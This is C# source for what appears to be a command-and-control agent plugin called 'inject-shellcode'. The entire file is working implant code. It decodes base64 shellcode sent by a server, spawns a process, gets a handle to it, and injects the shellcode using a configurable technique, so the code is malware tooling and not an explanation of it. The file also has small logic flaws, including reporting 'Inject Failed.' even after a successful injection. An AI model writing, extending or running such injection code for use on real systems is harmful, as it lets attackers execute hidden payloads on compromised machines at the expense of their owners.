using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;
using System.Reflection;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "inject-shellcode";
        private IMessageManager messageManager { get; set; }
        private IAgentConfig config { get; set; }
        private ILogger logger { get; set; }
        private ISpawner spawner { get; set; }
        private List<ITechnique> techniques = new List<ITechnique>();
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.spawner = spawner;
            this.logger = logger;
            this.config = config;
            GetTechniques();
        }

        public async Task Execute(ServerJob job)
        {
            InjectArgs args = JsonSerializer.Deserialize<InjectArgs>(job.task.parameters);

            if (!args.Validate(out var message))
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = message,
                    completed = true,
                    status = "error"
                });
                return;
            }

            //Create new process
            byte[] buf = Misc.Base64DecodeToByteArray(args.asm);

            await WriteDebug("Spawning Process.", job.task.id);
            if (!await this.spawner.Spawn(args.GetSpawnOptions(job.task.id)))
            {
                await messageManager.WriteLine("Process spawn failed.", job.task.id, true);
                return;
            }

            await WriteDebug("Getting Process Handle.", job.task.id);
            if (!spawner.TryGetHandle(job.task.id, out var handle))
            {
                await messageManager.WriteLine("Failed to get handle for process", job.task.id, true);
                return;
            }

            await WriteDebug("Selecting Technique with ID: " + this.config.inject, job.task.id);
            try
            {
                var technique = techniques.Where(x => x.id == this.config.inject).First();
                if (technique is null)
                {
                    await WriteDebug("Technique is Null.", job.task.id);
                    return;
                }
                
                await WriteDebug("Spawning Process.", job.task.id);
                if (!technique.Inject(buf, handle.DangerousGetHandle()))
                {
                    await messageManager.WriteLine("Inject Failed.", job.task.id, true, "error");
                    return;
                }
            }
            catch (Exception e)
            {
                await WriteDebug(e.ToString(), job.task.id);
            }

            await messageManager.WriteLine("Inject Failed.", job.task.id, true);
            return;
        }

        private void GetTechniques()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            foreach(Type t in asm.GetTypes())
            {
                if (!typeof(ITechnique).IsAssignableFrom(t))
                {
                    continue;
                }
                try
                {
                    techniques.Add((ITechnique)Activator.CreateInstance(t));
                }
                catch
                {
                    continue;
                }
            }
        }

        private async Task WriteDebug(string message, string task_id){
            if (config.debug)
            {
                await this.messageManager.WriteLine(message, task_id, false);
            }
        }
    }
}
